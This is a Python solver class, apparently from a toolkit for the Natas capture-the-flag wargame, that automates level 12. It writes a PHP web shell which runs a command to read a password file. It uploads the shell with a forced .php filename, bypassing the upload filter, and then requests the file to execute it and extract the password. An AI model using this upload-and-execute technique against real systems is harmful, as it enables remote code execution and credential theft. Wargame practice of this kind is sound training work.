import os
import re
from .base_solver import NatasSolver

class Natas12Solver(NatasSolver):
    def solve(self) -> str:
        try:
            # Create PHP web shell payload
            payload = '<?php system("cat /etc/natas_webpass/natas13"); ?>'
            payload_path = 'payloads/temp_payload.php'
            
            # Write payload to temporary file
            with open(payload_path, 'w') as f:
                f.write(payload)
            
            # Upload payload with PHP extension
            with open(payload_path, 'rb') as f:
                response = self.make_request(
                    method="POST",
                    files={"uploadedfile": f},
                    data={
                        "filename": "shell.php",  # Force PHP extension
                        "MAX_FILE_SIZE": "1000"
                    }
                )
            
            # Clean up temporary file
            os.remove(payload_path)
            
            # Extract uploaded file path
            match = re.findall(r'upload/([\w]+\.php)', response.text)
            if not match:
                raise ValueError("Could not find uploaded file path")
                
            uploaded_file = match[0]
            print(f"[+] File uploaded as: {uploaded_file}")
            
            # Execute payload by accessing the uploaded file
            response = self.make_request(f"upload/{uploaded_file}")
            
            # Password should be the only content returned
            password = response.text.strip()
            if not password or len(password) != 32:
                raise ValueError("Invalid password format in response")
                
            return password
            
        except Exception as e:
            raise RuntimeError(f"Failed to solve natas12: {str(e)}")
